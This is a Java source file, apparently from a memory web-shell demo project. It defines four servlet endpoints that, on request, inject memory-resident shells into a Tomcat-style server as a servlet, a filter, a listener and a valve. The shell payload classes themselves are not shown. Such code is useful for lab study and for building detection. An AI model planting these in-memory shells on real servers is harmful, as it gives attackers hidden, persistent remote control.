package com.spkiddai.memoryserver.Servlet;

import com.spkiddai.memoryserver.Shell.FilterShell;
import com.spkiddai.memoryserver.Shell.ListenerShell;
import com.spkiddai.memoryserver.Shell.ServletShell;
import com.spkiddai.memoryserver.Shell.ValveShell;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class ShellServlet {

    @WebServlet(name = "RegisterServletShell", urlPatterns = "/servlet/memshell")
    public static class RegisterServletShell extends HttpServlet {
        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
            try {
                ServletShell servletShell = new ServletShell();
                servletShell.addServlet(request);
                response.getWriter().println("ServletShell Register Success");
            } catch (Exception e) {
                response.getWriter().write("Error Register ServletShell: " + e.getMessage());
            }
        }
    }

    @WebServlet(name = "RegisterFilterShell", urlPatterns = "/filter/memshell")
    public static class RegisterFilterShell extends HttpServlet {
        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
            try {
                FilterShell filterShell = new FilterShell();
                filterShell.addFilter(request);
                response.getWriter().println("FilterShell Register Success");
            } catch (Exception e) {
                response.getWriter().write("Error Register FilterShell: " + e.getMessage());
            }
        }
    }

    @WebServlet(name = "RegisterListenerShell", urlPatterns = "/listener/memshell")
    public static class RegisterListenerShell extends HttpServlet {
        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
            try {
                ListenerShell listenerShell = new ListenerShell();
                listenerShell.addListener(request);
                response.getWriter().println("ListenerShell Register Success");
            } catch (Exception e) {
                response.getWriter().write("Error Register ListenerShell: " + e.getMessage());
            }
        }
    }

    @WebServlet(name = "RegisterValveShell", urlPatterns = "/valve/memshell")
    public static class RegisterValveShell extends HttpServlet {
        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
            try {
                ValveShell valveShell = new ValveShell();
                valveShell.addValve(request);
                response.getWriter().println("ValveShell Register Success");
            } catch (Exception e) {
                response.getWriter().write("Error Register ValveShell: " + e.getMessage());
            }
        }
    }
}
